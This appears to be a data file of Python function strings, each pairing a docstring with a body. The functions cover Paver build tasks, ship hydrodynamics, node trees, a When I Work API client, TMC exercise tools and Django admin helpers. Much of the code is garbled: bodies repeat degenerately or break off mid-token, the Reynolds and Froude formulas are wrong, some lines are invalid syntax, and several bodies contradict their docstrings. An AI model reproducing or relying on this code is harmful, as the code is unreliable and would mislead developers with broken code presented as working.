        "def pycheck(ctx, options):\n    \"\"\"passive check of python programs by pyflakes.\n\n    requirements:\n     - pyflakes_ should be installed. ``easy_install pyflakes``\n\n    options.paved.pycheck.pyflakes.param\n\n    .. _pyflakes: http://pypi.python.org/pypi/pyflakes\n    \"\"\"\n    if not options.paved:\n        return\n\n    if not options.pyflakes:\n        return\n\n    if not options.param:\n        return\n\n    if not options.paved:\n        return\n\n    if not options.pyflakes.param:\n        return\n\n    if not options.paved:\n        return\n\n    if not options.param.param:\n        return\n\n    if not options.paved.param.param:",
        "def handle_exception(exception):\n    \"\"\"Handle HTTP exception\n\n    :param werkzeug.exceptions.HTTPException exception: Raised exception\n\n    A response is returned, as formatted by the :py:func:`response` function.\n    \"\"\"\n    response = response(\n        exception.message,\n        status=exception.status_code,\n        mimetype=exception.mimetype,\n        headers=exception.headers,\n        content_type=exception.content_type,\n    )\n    response.set_status(exception.status_code)\n    return response",
        "def is_valid_css_colour(value):\n    \"\"\"\n    Returns True if the value given is a valid CSS colour, i.e. matches one\n    of the regular expressions in the module or is in the list of\n    predetefined values by the browser.\n    \"\"\"\n    if value in CSS_PREDEFINED_COLOURS:\n        return True\n    if value in CSS_PREDEFINED_COLOURS_BROWSER:\n        return True\n    return False",
        "def reynold_number(length, speed, temperature=None):\n    \"\"\"\n    Reynold number utility function that return Reynold number for vehicle at specific length and speed.\n    Optionally, it can also take account of temperature effect of sea water.\n\n        Kinematic viscosity from: http://web.mit.edu/seawater/2017_MIT_Seawater_Property_Tables_r2.pdf\n\n    :param length: metres length of the vehicle\n    :param speed: m/s speed of the vehicle\n    :param temperature: degree C \n    :return: Reynolds number of the vehicle (dimensionless)\n    \"\"\"\n    if temperature is None:\n        temperature = 0\n    return (length * speed) / (length * (1 + temperature))",
        "def froude_number(speed, length):\n    \"\"\"\n    Froude number utility function that return Froude number for vehicle at specific length and speed.\n\n    :param speed: m/s speed of the vehicle\n    :param length: metres length of the vehicle\n    :return: Froude number of the vehicle (dimensionless)\n    \"\"\"\n    return (length * (1.0 / speed)) / (length * (1.0 / (speed * 1.0)))",
        "def residual_resistance_coefficient(slenderness, prismatic_coef, froude_number):\n    \"\"\"\n    Residual resistance coefficient estimation from slenderness function, prismatic coefficient and Froude number.\n\n    :param slenderness: Slenderness coefficient dimensionless :math:`L/(\u2207^{1/3})` where L is length of ship, \u2207 is displacement\n    :param prismatic_coef: Prismatic coefficient dimensionless :math:`\u2207/(L\\cdot A_m)` where L is length of ship, \u2207 is displacement Am is midsection area of the ship\n    :param froude_number: Froude number of the ship dimensionless \n    :return: Residual resistance of the ship\n    \"\"\"\n    return (slenderness * prismatic_coef",
        "def set_dimension_values(self, length, draught, beam, speed,\n                                slenderness_coefficient=None,\n                                prismatic_coefficient=None):\n        \"\"\"\n        Assign values for the main dimension of a ship.\n\n        :param length: metres length of the vehicle\n        :param draught: metres draught of the vehicle\n        :param beam: metres beam of the vehicle\n        :param speed: m/s speed of the vehicle\n        :param slenderness_coefficient: Slenderness coefficient dimensionless :math:`L/(\u2207^{1/3})` where L is length of ship,\n            \u2207 is displacement\n        :param prismatic_coefficient: Prismatic coefficient dimensionless :math:`\u2207/(L\\cdot A_m)` where L is length of ship",
        "def resistance(self):\n        \"\"\"Return resistance of the vehicle.\n\n        :return: newton the resistance of the ship\n        \"\"\"\n        if self.resistance_type == 'newton':\n            return self.resistance_newton\n        elif self.resistance_type == 'slip':\n            return self.resistance_slip\n        else:\n            raise ValueError('Unknown resistance type: {}'.format(self.resistance_type))",
        "def max_deck_area(self, water_plane_coef=0.0):\n        \"\"\"\n        Return the maximum deck area of the ship\n\n        :param water_plane_coef: optional water plane coefficient\n        :return: Area of the deck\n        \"\"\"\n        return self.max_deck_area_per_plane(water_plane_coef=water_plane_coef)",
        "def propulsion_power(self, propulsion_eff, sea_margin=0.01):\n        \"\"\"\n        Total propulsion power of the ship.\n\n        :param propulsion_eff: Shaft efficiency of the ship\n        :param sea_margin: Sea margin take account of interaction between ship and the sea, e.g. wave\n        :return: Watts shaft propulsion power of the ship\n        \"\"\"\n        return self.watts_shaft * (propulsion_eff * sea_margin)",
        "def configure(self, url=None, token=None):\n        \"\"\"Configure the api to use given url and token or to get them from the\n        Config.\n        \"\"\"\n        if url is None:\n            url = self.config.get('url')\n        if token is None:\n            token = self.config.get('token')\n        self.url = url\n        self.token = token",
        "def send_zipfile(self, exercise, zip_path):\n        \"\"\"Send zipfile to TMC for given exercise\"\"\"\n        self.send_command(exercise, 'send_zipfile', zip_path)",
        "def _validate_request_url(self, request_url):\n        \"\"\"Ensures that the request url is valid.\n        Sometimes we have URLs that the server gives that are preformatted,\n        sometimes we need to form our own.\n        \"\"\"\n        if not request_url:\n            raise ValueError(\"Request URL is empty\")\n        if not self.is_valid_url(request_url):\n            raise ValueError(\"Request URL is not valid\")",
        "def _extract_json(self, response):\n        \"\"\" Extract json from a response.\n            Assumes response is valid otherwise.\n            Internal use only.\n        \"\"\"\n        if response.status_code == 200:\n            return response.json()\n        else:\n            raise Exception(response.text)",
        "def _joinall_if_killed(greenlets):\n    \"\"\"Wrapper for gevent.joinall if the greenlet that waits for the joins is killed, it kills all the greenlets it\n    joins for.\n    \"\"\"\n    for greenlet in greenlets:\n        if greenlet.is_alive():\n            greenlet.join()",
        "def create_error(code, *args, **kwargs):\n    \"\"\"\n    Creates an error from the given code, and args and kwargs.\n\n    :param code: The acknowledgement code\n    :param args: Exception args\n    :param kwargs: Exception kwargs\n    :return: the error for the given acknowledgement code\n    \"\"\"\n    return Error(code, args, kwargs)",
        "def to_message(self):\n        \"\"\"\n        Creates an error Acknowledgement message.\n        The message's code and message are taken from this exception.\n\n        :return: the message representing this exception\n        \"\"\"\n        message = Message()\n        message.code = self.code\n        message.message = self.message\n        return message",
        "def clean(options):\n    \"\"\"Clean up extra files littering the source tree.\n\n    options.paved.clean.dirs: directories to search recursively\n    options.paved.clean.patterns: patterns to search for and remove\n    \"\"\"\n    if options.paved.clean.dirs:\n        for d in options.paved.clean.dirs:\n            if not os.path.exists(d):\n                continue\n            for f in os.listdir(d):\n                if f.endswith('.py'):\n                    continue\n                if f.endswith('.pyc'):\n                    continue\n                if f.endswith('.pyo'):\n                    continue\n                if f.endswith('.pyo.py'):\n                    continue\n                if f.endswith('.pyo.pyc'):\n                    continue\n                if f.ends",
        "def print_options(options):\n    \"\"\"print paver options.\n\n    Prettified by json.\n    `long_description` is removed\n    \"\"\"\n    print(json.dumps(options, indent=4, sort_keys=True, separators=(',', ': ')))",
        "def _parse_message(self, message):\n        \"\"\"\\\n        Parses a binary protobuf message into a Message object.\n        \"\"\"\n        message_type = message.DESCRIPTOR.message_type\n        message_name = message.DESCRIPTOR.full_name\n        message_class = message_type.DESCRIPTOR.message_class\n        message_class_name = message_class.DESCRIPTOR.full_name\n        message_class_name = message_class_name.replace('.', '_')\n        message_class = self._get_message_class(message_class_name)\n        message_class_instance = message_class()\n        message_class_instance.ParseFromString(message)\n        return message_class_instance",
        "def create(self, **kwargs):\n        \"\"\"\n        Creates a new ``Node`` based on the extending class and adds it as\n        a child to this ``Node``.\n\n        :param kwargs: \n            arguments for constructing the data object associated with this\n            ``Node``\n        :returns: \n            extender of the ``Node`` class\n        \"\"\"\n        extender = self.extender_class(**kwargs)\n        self.add_child(extender)\n        return extender",
        "def ancestors(self):\n        \"\"\"Returns a list of the ancestors of this node.\"\"\"\n        ancestors = []\n        while self.parent:\n            ancestors.append(self.parent)\n            self = self.parent\n        return ancestors",
        "def ancestors(self):\n        \"\"\"\n        Returns a list of the ancestors of this node but does not pass the\n        root node, even if the root has parents due to cycles.\n        \"\"\"\n        ancestors = []\n        while self.parent:\n            ancestors.append(self.parent)\n            self = self.parent\n        return ancestors",
        "def get_descendants(self):\n        \"\"\"Returns a list of descendents of this node.\"\"\"\n        if self.parent is None:\n            return []\n        return [self.parent] + self.parent.get_descendants()",
        "def _can_be_removed(self, node):\n        \"\"\"\n        Returns True if it is legal to remove this node and still leave the\n        graph as a single connected entity, not splitting it into a forest.\n        Only nodes with no children or those who cause a cycle can be deleted.\n        \"\"\"\n        if node.parent is None:\n            return True\n        if node.parent.is_root:\n            return True\n        if node.parent.is_leaf:\n            return True\n        if node.parent.is_root:\n            return False\n        if node.parent.is_leaf:\n            return False\n        if node.parent.is_root:\n            return False\n        if node.parent.is_leaf:\n            return False\n        return True",
        "def remove_all_descendents(self):\n        \"\"\"\n        Removes the node and all descendents without looping back past the\n        root.  Note this does not remove the associated data objects.\n\n        :returns:\n            list of :class:`BaseDataNode` subclassers associated with the\n            removed ``Node`` objects.\n        \"\"\"\n        children = self.children\n        for child in children:\n            child.remove_all_descendents()\n        return children",
        "def prune(self):\n        \"\"\"\n        Returns a list of nodes that would be removed if prune were called\n        on this element.\n        \"\"\"\n        pruned = []\n        for node in self.nodes:\n            if node.is_leaf:\n                pruned.append(node)\n        return pruned",
        "def _verify_child(self, child):\n        \"\"\"Called to verify that the given rule can become a child of the\n        current node.  \n\n        :raises AttributeError: \n            if the child is not allowed\n        \"\"\"\n        if child not in self.children:\n            raise AttributeError(\"Child %r is not allowed\" % child)",
        "def get_location(self, location_id):\n        \"\"\"\n        Returns location data.\n\n        http://dev.wheniwork.com/#get-existing-location\n        \"\"\"\n        url = self.base_url + '/locations/' + str(location_id)\n        return self.get_request(url)",
        "def locations(self):\n        \"\"\"\n        Returns a list of locations.\n\n        http://dev.wheniwork.com/#listing-locations\n        \"\"\"\n        url = self._build_url('locations')\n        return self._json(self._get(url), 200)",
        "def chi_square(self):\n        \"\"\"The reduced chi-square of the linear least squares\"\"\"\n        return np.sqrt(np.sum(self.y * self.y, axis=1) /\n                      np.sum(self.y, axis=1))",
        "def create(self, task):\n        \"\"\"Create the task on the server\"\"\"\n        if not self.is_running():\n            raise RuntimeError(\"Cannot create a task that is not running\")\n        self.task_queue.put(task)\n        self.task_queue.task_done()",
        "def update_task(self, task_id, data):\n        \"\"\"Update existing task on the server\"\"\"\n        return self.put(self.task_path % (task_id), data)",
        "def get_task(self, task_id):\n        \"\"\"Retrieve a task from the server\"\"\"\n        url = self.base_url + '/tasks/' + str(task_id)\n        return self.session.get(url)",
        "def format_color(string, color):\n    \"\"\"Formats a string with color\"\"\"\n    return colorize(string, color, bold=True)",
        "def get_user(self, username):\n        \"\"\"\n        Returns user profile data.\n\n        http://dev.wheniwork.com/#get-existing-user\n        \"\"\"\n        url = self.base_url + '/users/' + username\n        response = self.session.get(url)\n        response.raise_for_status()\n        return response.json()",
        "def users(self):\n        \"\"\"\n        Returns a list of users.\n\n        http://dev.wheniwork.com/#listing-users\n        \"\"\"\n        url = self._build_url('users')\n        return self._get(url)",
        "def _set_activate_command(self):\n        \"\"\"Attempt to set the virtualenv activate command, if it hasn't been specified.\"\"\"\n        if not self.activate_command:\n            self.activate_command = self.get_activate_command()\n        return self.activate_command",
        "def _update_dict(dest, src):\n    \"\"\"Recursively update the destination dict-like object with the source dict-like object.\n\n    Useful for merging options and Bunches together!\n\n    Based on:\n    http://code.activestate.com/recipes/499335-recursively-update-a-dictionary-without-hitting-py/#c1\n    \"\"\"\n    for key, value in src.items():\n        if isinstance(value, dict):\n            _update_dict(dest[key], value)\n        else:\n            dest[key] = value",
        "def pip_install(args):\n    \"\"\"Send the given arguments to `pip install`.\"\"\"\n    if not args:\n        return\n    if args[0] == 'install':\n        return\n    if args[0] == 'uninstall':\n        return\n    if args[0] == 'list':\n        return\n    if args[0] == 'update':\n        return\n    if args[0] == 'list-packages':\n        return\n    if args[0] == 'list-dev-packages':\n        return\n    if args[0] == 'list-packages-dev':\n        return\n    if args[0] == 'list-packages-dev-dev':\n        return\n    if args[0] == 'list-packages-dev-dev-dev':\n        return\n    if args[0] == 'list-packages-dev-dev-dev-",
        "def get(self, request, *args, **kwargs):\n        \"\"\"\n        When I Work GET method. Return representation of the requested\n        resource.\n        \"\"\"\n        resource = self.get_object()\n        return self.get_representation(resource)",
        "def put(self, request, *args, **kwargs):\n        \"\"\"When I Work PUT method.\"\"\"\n        self.object = self.get_object()\n        self.object.update(request.data)\n        self.object.save()\n        return Response(status=status.HTTP_204_NO_CONTENT)",
        "def post(self, request, *args, **kwargs):\n        \"\"\"When I Work POST method.\"\"\"\n        self.object = self.get_object()\n        self.object.save()\n        messages.success(request, self.success_message)\n        return HttpResponseRedirect(reverse('admin:index'))",
        "def delete(self, request, *args, **kwargs):\n        \"\"\"When I Work DELETE method.\"\"\"\n        self.object = self.get_object()\n        self.object.delete()\n        return Response(status=status.HTTP_204_NO_CONTENT)",
        "def create_shift(self, name, start_time, end_time,\n                      description=None,\n                      start_date=None, end_date=None,\n                      start_time_zone=None, end_time_zone=None,\n                      start_time_zone_offset=None, end_time_zone_offset=None,\n                      start_time_zone_offset_minutes=None,\n                      end_time_zone_offset_minutes=None,\n                      start_time_zone_offset_seconds=None,\n                      end_time_zone_offset_seconds=None,\n                      start_time_zone_offset_microseconds=None,\n                      end_time_zone_offset_microseconds=None,\n                      start_time_zone_offset_microseconds=None,\n                      start_time_zone_offset_microseconds=None,\n                      end_time",
        "def delete_shifts(self, shift_ids):\n        \"\"\"Delete existing shifts.\n\n        http://dev.wheniwork.com/#delete-shift\n        \"\"\"\n        params = {'shift_ids': shift_ids}\n        return self.post('shifts', params=params)",
        "def get_event_and_update_comments(self, event):\n        \"\"\"Returns combined list of event and update comments.\"\"\"\n        comments = self.get_comments(event)\n        event_comments = self.get_event_comments(event)\n        return comments, event_comments",
        "def get_chained_events(self, events):\n        \"\"\"Returns chained list of event and update images.\"\"\"\n        return [self.get_event(e) for e in chain(events, self.get_events())]",
        "def get_image_count(self):\n        \"\"\"Gets count of all images from both event and updates.\"\"\"\n        if self.event:\n            return self.event.get_image_count()\n        if self.update:\n            return self.update.get_image_count()\n        return 0",
        "def get_top_assets(self):\n        \"\"\"\n        Gets images and videos to populate top assets.\n\n        Map is built separately.\n        \"\"\"\n        top_assets = {}\n        for asset in self.top_assets:\n            top_assets[asset.name] = asset\n        return top_assets",
        "def progress(self, *args, **kwargs):\n        \"\"\"Decorated methods progress will be displayed to the user as a spinner.\n        Mostly for slower functions that do some network IO.\n        \"\"\"\n        def wrapper(func):\n            @wraps(func)\n            def wrapper_(*args, **kwargs):\n                self.progress_bar = ProgressBar(self.progress_bar_width, self.progress_bar_height)\n                self.progress_bar.start()\n                try:\n                    return func(*args, **kwargs)\n                finally:\n                    self.progress_bar.stop()\n            return wrapper_\n        return wrapper",
        "def launch_menu(self, menu):\n        \"\"\"Launches a new menu. Wraps curses nicely so exceptions won't screw with\n        the terminal too much.\"\"\"\n        try:\n            self.curses.initscr()\n            self.curses.keypad(True)\n            self.curses.bkgd()\n            self.curses.noecho()\n            self.curses.curs_set(0)\n            self.curses.endwin()\n            self.curses.keypad(False)\n            self.curses.nodelay(True)\n            self.curses.bkgd()\n            self.curses.noecho()\n            self.curses.curs_set(0)\n            self.curses.endwin()\n            self.curses.keypad(False)\n            self.curses.nodelay",
        "def save(self, *args, **kwargs):\n        \"\"\"\n        Overridden method that handles that re-ranking of objects and the\n        integrity of the ``rank`` field.\n\n        :param rerank:\n            Added parameter, if True will rerank other objects based on the\n            change in this save.  Defaults to True.\n        \"\"\"\n        if self.rank is None:\n            self.rank = self.object.rank\n        super(Rankable, self).save(*args, **kwargs)",
        "def _remove_blank_ranks(self):\n        \"\"\"Removes any blank ranks in the order.\"\"\"\n        for rank in self.ranks:\n            if rank.is_blank:\n                self.ranks.remove(rank)",
        "def get_fields(obj, ignore_auto=True, ignore_relations=True, exclude=None):\n    \"\"\"Returns the field names of a Django model object.\n\n    :param obj: the Django model class or object instance to get the fields\n        from\n    :param ignore_auto: ignore any fields of type AutoField. Defaults to True\n    :param ignore_relations: ignore any fields that involve relations such as\n        the ForeignKey or ManyToManyField\n    :param exclude: exclude anything in this list from the results\n\n    :returns: generator of found field names\n    \"\"\"\n    if ignore_auto:\n        return (\n            field.name\n            for field in obj._meta.fields\n            if not isinstance(field, AutoField)\n        )\n    if ignore_relations:\n        return (\n            field.name\n            for field in obj._meta.fields\n            if",
        "def register_error_handlers():\n    \"\"\"Register all HTTP error code error handlers\n\n    Currently, errors are handled by the JSON error handler.\n    \"\"\"\n    app.errorhandler(400).add_to_class('json', JSONError)\n    app.errorhandler(404).add_to_class('json', JSONError)\n    app.errorhandler(405).add_to_class('json', JSONError)\n    app.errorhandler(415).add_to_class('json', JSONError)\n    app.errorhandler(422).add_to_class('json', JSONError)\n    app.errorhandler(423).add_to_class('json', JSONError)\n    app.errorhandler(500).add_to_class('json', JSONError)",
        "def plot_resized(args, ax=None, **kwargs):\n    \"\"\"\n    Plots but automatically resizes x axis.\n\n    .. versionadded:: 1.4\n\n    Parameters\n    ----------\n    args\n        Passed on to :meth:`matplotlib.axis.Axis.plot`.\n    ax : :class:`matplotlib.axis.Axis`, optional\n        The axis to plot to.\n    kwargs\n        Passed on to :meth:`matplotlib.axis.Axis.plot`.\n    \"\"\"\n    if ax is None:\n        ax = plt.gca()\n    ax.set_xlim(args.xmin, args.xmax)\n    ax.set_ylim(args.ymin, args.ymax)\n    ax.set_zlim(args.zmin, args.zmax)\n    ax.set_xticks(args.xticks)",
        "def interval_vector(start, stop, step):\n    \"\"\"Create a vector of values over an interval with a specified step size.\n\n    Parameters\n    ----------\n\n    start : float\n        The beginning of the interval.\n    stop : float\n        The end of the interval.\n    step : float\n        The step size.\n\n    Returns\n    -------\n    vector : :class:`numpy.ndarray`\n        The vector of values.\n    \"\"\"\n    vector = np.linspace(start, stop, step)\n    return vector",
        "def _select_course(self, course):\n        \"\"\"Passes the selected course as the first argument to func.\"\"\"\n        if course is None:\n            return\n        self.func(course)",
        "def _select_exercise(self, exercise):\n        \"\"\"Passes the selected exercise as the first argument to func.\"\"\"\n        if exercise is None:\n            return\n        if self.exercises:\n            if exercise in self.exercises:\n                return\n        raise ValueError(\"No exercise selected\")",
        "def exit_if_false(func):\n    \"\"\"If func returns False the program exits immediately.\"\"\"\n    @functools.wraps(func)\n    def wrapper(*args, **kwargs):\n        if func(*args, **kwargs):\n            sys.exit(0)\n    return wrapper",
        "def configure(self):\n        \"\"\"Configure tmc.py to use your account.\"\"\"\n        self.log.info(\"Setting up tmc.py\")\n        self.log.info(\"\")\n        self.log.info(\"\")\n        self.log.info(\"\")\n        self.log.info(\"\")\n        self.log.info(\"\")\n        self.log.info(\"\")\n        self.log.info(\"\")\n        self.log.info(\"\")\n        self.log.info(\"\")\n        self.log.info(\"\")\n        self.log.info(\"\")\n        self.log.info(\"\")\n        self.log.info(\"\")\n        self.log.info(\"\")\n        self.log.info(\"\")\n        self.log.info(\"\")\n        self.log.info(\"\")\n        self.log.info(\"\")\n        self",
        "def download_exercises(self):\n        \"\"\"Download the exercises from the server.\"\"\"\n        response = self.session.get(self.base_url + '/exercises')\n        response.raise_for_status()\n        return response.json()",
        "def next_exercise(self):\n        \"\"\"Go to the next exercise.\"\"\"\n        if self.exercises:\n            self.exercise = self.exercises.pop()\n            self.exercise_id = self.exercise.id\n            self.exercise_name = self.exercise.name\n            self.exercise_description = self.exercise.description\n            self.exercise_status = self.exercise.status\n            self.exercise_status_text = self.exercise.status_text\n            self.exercise_status_image = self.exercise.status_image\n            self.exercise_status_image_url = self.exercise.status_image_url\n            self.exercise_status_image_width = self.exercise.status_image_width\n            self.exercise_status_image_height =",
        "def spawn_process(self, command, *args, **kwargs):\n        \"\"\"Spawns a process with `command path-of-exercise`\"\"\"\n        kwargs.setdefault('cwd', self.cwd)\n        kwargs.setdefault('shell', True)\n        kwargs.setdefault('env', os.environ)\n        kwargs.setdefault('stdin', self.stdin)\n        kwargs.setdefault('stdout', self.stdout)\n        kwargs.setdefault('stderr', self.stderr)\n        kwargs.setdefault('shell_shell', True)\n        kwargs.setdefault('shell_env', os.environ)\n        kwargs.setdefault('env_path', self.env_path)\n        kwargs.setdefault('cwd_path', self.cwd_path)\n        kwargs.setdefault('cwd_name', self.cwd_name)\n        kwargs.setdefault('cwd_",
        "def select_course(self, course_id, exercise_id=None):\n        \"\"\"Select a course or an exercise.\"\"\"\n        if course_id:\n            self.course_id = course_id\n        if exercise_id:\n            self.exercise_id = exercise_id\n        self.course_id = None\n        self.exercise_id = None",
        "def submit_exercise(self, exercise):\n        \"\"\"Submit the selected exercise to the server.\"\"\"\n        if exercise.id:\n            self.exercises.append(exercise)\n            self.exercises_submitted.append(exercise.id)\n            self.exercises_submitted_count += 1\n            self.exercises_submitted_count_total += 1\n            self.exercises_submitted_count_total_total += 1\n            self.exercises_submitted_count_total_total += 1\n            self.exercises_submitted_count_total_total += 1\n            self.exercises_submitted_count_total_total += 1\n            self.exercises_submitted_count_total_total += 1\n            self.exercises_submitted_count_total_total += 1\n            self.exercises_submitted_",
        "def send_selected_exercise(self):\n        \"\"\"Sends the selected exercise to the TMC pastebin.\"\"\"\n        if self.selected_exercise:\n            self.send_pastebin(self.selected_exercise)",
        "def update_data(self, course_id=None, course_name=None, course_description=None,\n                    course_type=None, course_status=None, course_start_date=None,\n                    course_end_date=None, course_start_time=None, course_end_time=None,\n                    course_course_type=None, course_course_status=None,\n                    course_course_start_date=None, course_course_end_date=None,\n                    course_course_start_time=None, course_course_end_time=None,\n                    course_course_course_type=None, course_course_course_status=None,\n                    course_course_course_start_date=None, course_course_course_end_date=None,\n                    course_course_course_start_time=None, course",
        "def _determine_type(x):\n    \"\"\"Determine the type of x\"\"\"\n    if isinstance(x, (list, tuple)):\n        return 'list'\n    elif isinstance(x, dict):\n        return 'dict'\n    elif isinstance(x, (float, int)):\n        return 'number'\n    elif isinstance(x, bool):\n        return 'boolean'\n    elif isinstance(x, str):\n        return 'string'\n    elif isinstance(x, (datetime, date)):\n        return 'date'\n    elif isinstance(x, (float, int, float, bool)):\n        return 'number'\n    elif isinstance(x, (list, tuple)):\n        return 'list'\n    elif isinstance(x, dict):\n        return 'dict'\n    elif isinstance(x, (list, tuple)):\n        return 'list'\n    else",
        "def _get_dir_map(self, path):\n        \"\"\"map for a directory\"\"\"\n        if path in self._dir_map:\n            return self._dir_map[path]\n        else:\n            return self._dir_map[path] = self._get_dir_map(os.path.join(path, '..'))",
        "def _apply_types(self, line):\n        \"\"\"Apply the types on the elements of the line\"\"\"\n        for i, elem in enumerate(self.elements):\n            elem.type = self.types[i]\n            if elem.type == 'string':\n                elem.type = self.types['string']\n            if elem.type == 'number':\n                elem.type = self.types['number']\n            if elem.type == 'boolean':\n                elem.type = self.types['boolean']\n            if elem.type == 'date':\n                elem.type = self.types['date']\n            if elem.type == 'time':\n                elem.type = self.types['time']\n            if elem.type == 'datetime':\n                elem.type = self.types['datetime']\n            if elem.type == 'time':\n                elem.type = self.",
        "def convert_file(self, filename):\n        \"\"\"Convert a file to a .csv file\"\"\"\n        with open(filename, 'r') as f:\n            reader = csv.reader(f)\n            writer = csv.writer(open(filename, 'w'))\n            writer.writerow(self.header)\n            for row in reader:\n                writer.writerow(row)",
        "def get_change_list_link(obj, display=None):\n    \"\"\"\n    Returns a link to the django admin change list with a filter set to\n    only the object given.\n\n    :param obj:\n        Object to create the admin change list display link for\n    :param display:\n        Text to display in the link.  Defaults to string call of the object\n    :returns:\n        Text containing HTML for a link\n    \"\"\"\n    if display is None:\n        display = str(obj)\n    return '<a href=\"%s\">%s</a>' % (admin.site.admin_url, display)",
        "def display_object(obj, display_template=None):\n    \"\"\"\n    Returns string representation of an object, either the default or based\n    on the display template passed in.\n    \"\"\"\n    if display_template is None:\n        return display_object_default(obj)\n    else:\n        return display_template.format(obj)",
        "def add_link(self, attr, title=None, display=None,\n                  context=None, **kwargs):\n        \"\"\"\n        Adds a ``list_display`` attribute that appears as a link to the\n        django admin change page for the type of object being shown. Supports\n        double underscore attribute name dereferencing.\n\n        :param attr:\n            Name of the attribute to dereference from the corresponding\n            object, i.e. what will be lined to.  This name supports double\n            underscore object link referencing for ``models.ForeignKey``\n            members.\n\n        :param title:\n            Title for the column of the django admin table.  If not given it\n            defaults to a capitalized version of ``attr``\n\n        :param display:\n            What to display as the text for the link being shown.  If not\n            given it defaults to the string representation of the object for",
        "def add_list_display(self, attr, title=None, display=None,\n                          link_type=None, link_class=None,\n                          link_title=None, link_context=None):\n        \"\"\"\n        Adds a ``list_display`` attribute showing an object.  Supports\n        double underscore attribute name dereferencing.\n\n        :param attr:\n            Name of the attribute to dereference from the corresponding\n            object, i.e. what will be lined to.  This name supports double\n            underscore object link referencing for ``models.ForeignKey``\n            members.\n\n        :param title:\n            Title for the column of the django admin table.  If not given it\n            defaults to a capitalized version of ``attr``\n\n        :param display:\n            What to display as the text for the link being shown.  If not\n            given it defaults to the string",
        "def list_display(self, field, format_string=None, title=None):\n        \"\"\"\n        Adds a ``list_display`` attribute showing a field in the object\n        using a python %formatted string.\n\n        :param field:\n            Name of the field in the object.\n\n        :param format_string:\n            A old-style (to remain python 2.x compatible) % string formatter\n            with a single variable reference. The named ``field`` attribute\n            will be passed to the formatter using the \"%\" operator. \n\n        :param title:\n            Title for the column of the django admin table.  If not given it\n            defaults to a capitalized version of ``field``\n        \"\"\"\n        if format_string is None:\n            format_string = self.get_field_format_string(field)\n        if title is None:\n            title = self.get",
        "def post_required(options=None):\n    \"\"\"\n    View decorator that enforces that the method was called using POST.\n    This decorator can be called with or without parameters.  As it is\n    expected to wrap a view, the first argument of the method being wrapped is\n    expected to be a ``request`` object.\n\n    .. code-block:: python\n\n        @post_required\n        def some_view(request):\n            pass\n\n\n        @post_required(['firstname', 'lastname'])\n        def some_view(request):\n            pass\n\n    The optional parameter contains a single list which specifies the names of\n    the expected fields in the POST dictionary.  The list is not exclusive,\n    you can pass in fields that are not checked by the decorator.\n\n    :param options:\n        List of the names of expected POST keys.\n    \"\"\"\n    def",
        "def json_post_required(field, request_name=None):\n    \"\"\"\n    View decorator that enforces that the method was called using POST and\n    contains a field containing a JSON dictionary. This method should\n    only be used to wrap views and assumes the first argument of the method\n    being wrapped is a ``request`` object.\n\n    .. code-block:: python\n\n        @json_post_required('data', 'json_data')\n        def some_view(request):\n            username = request.json_data['username']\n\n    :param field:\n        The name of the POST field that contains a JSON dictionary\n    :param request_name:\n        [optional] Name of the parameter on the request to put the\n        deserialized JSON data. If not given the field name is used\n    \"\"\"\n    def decorator(view_func):\n        @functools.w",
        "def divergence(self, beam):\n        \"\"\"Divergence of matched beam\"\"\"\n        return np.sqrt(self.beam_dist(beam) - self.beam_dist(beam, axis=1))",
        "def plasma_density(self):\n        \"\"\"The plasma density in SI units.\"\"\"\n        if self._plasma_density is None:\n            self._plasma_density = self._get_plasma_density()\n        return self._plasma_density",
        "def _deploy_helper(self, tag, deployment_name, deployment_dir,\n                       deployment_type, deployment_args,\n                       deployment_env, deployment_args_file):\n        \"\"\"Semver tag triggered deployment helper\"\"\"\n        if deployment_type == 'docker':\n            self._deploy_docker(tag, deployment_name, deployment_dir,\n                                 deployment_args, deployment_env,\n                                 deployment_args_file)\n        elif deployment_type == 'docker-registry':\n            self._deploy_docker_registry(tag, deployment_name, deployment_dir,\n                                          deployment_args, deployment_env,\n                                          deployment_args_file)\n        elif deployment_type == 'docker-registry-registry':\n            self._deploy_docker_registry_registry(tag, deployment_name, deployment_dir,\n                                                  deployment_args, deployment_env,\n                                                 ",
        "def check_environment(self):\n        \"\"\"Performs some environment checks prior to the program's execution\"\"\"\n        if self.env_vars:\n            for key in self.env_vars:\n                if key not in self.env:\n                    raise ValueError(\"Environment variable %s is not set\" % key)\n                if self.env[key] is None:\n                    raise ValueError(\"Environment variable %s is not set\" % key)",
        "def tag(ctx):\n    \"\"\"Prints latest tag's information\"\"\"\n    if not ctx.obj['tag']:\n        click.echo('No tag found')\n        return\n\n    click.echo(ctx.obj['tag'])\n    click.echo('Created: %s' % ctx.obj['tag']['created'])\n    click.echo('Updated: %s' % ctx.obj['tag']['updated'])\n    click.echo('Tags: %s' % ', '.join(ctx.obj['tag']['tags']))",
        "def prompt_user(self, message, default=None):\n        \"\"\"Prompts user before proceeding\"\"\"\n        if default is None:\n            default = self.default\n        prompt = self.prompt_user_format % (message, default)\n        return self.ask(prompt)",
        "def get_array(dataset, name):\n    \"\"\"Gets an array from datasets.\n\n    .. versionadded:: 1.4\n    \"\"\"\n    if dataset is None:\n        return None\n    if isinstance(dataset, Dataset):\n        return dataset.get_array(name)\n    return dataset.get_array(name, copy=False)",
        "def get_dir_state(self):\n        \"\"\"Get the current directory state\"\"\"\n        if self.is_dir:\n            return self.get_dir_info()\n        else:\n            return self.get_file_info()",
        "def _add_tick(self, tick):\n        \"\"\"Add one tick to progress bar\"\"\"\n        if tick.value is None:\n            return\n        if self.value is None:\n            self.value = tick.value\n        self.value += tick.value\n        self.bar.update(self.value)",
        "def push(self, k):\n        \"\"\"Push k to the top of the list\n\n        >>> l = DLL()\n        >>> l.push(1)\n        >>> l\n        [1]\n        >>> l.push(2)\n        >>> l\n        [2, 1]\n        >>> l.push(3)\n        >>> l\n        [3, 2, 1]\n        \"\"\"\n        if k in self:\n            return\n        self.push_left(k)\n        self.push_right(k)",
        "def increment(self, name):\n        \"\"\"\n        Call this method to increment the named counter.  This is atomic on\n        the database.\n\n        :param name:\n            Name for a previously created ``Counter`` object\n        \"\"\"\n        with self._lock:\n            self._counters[name] += 1\n            self._counters_by_name[name] = self._counters[name]",
        "def print_loading(self, wait=0, message=''):\n        \"\"\"print loading message on screen\n\n        .. note::\n\n            loading message only write to `sys.stdout`\n\n\n        :param int wait: seconds to wait\n        :param str message: message to print\n        :return: None\n        \"\"\"\n        if self.is_running:\n            self.print_message(message, wait)\n        else:\n            self.print_message('\\n' + message, wait)",
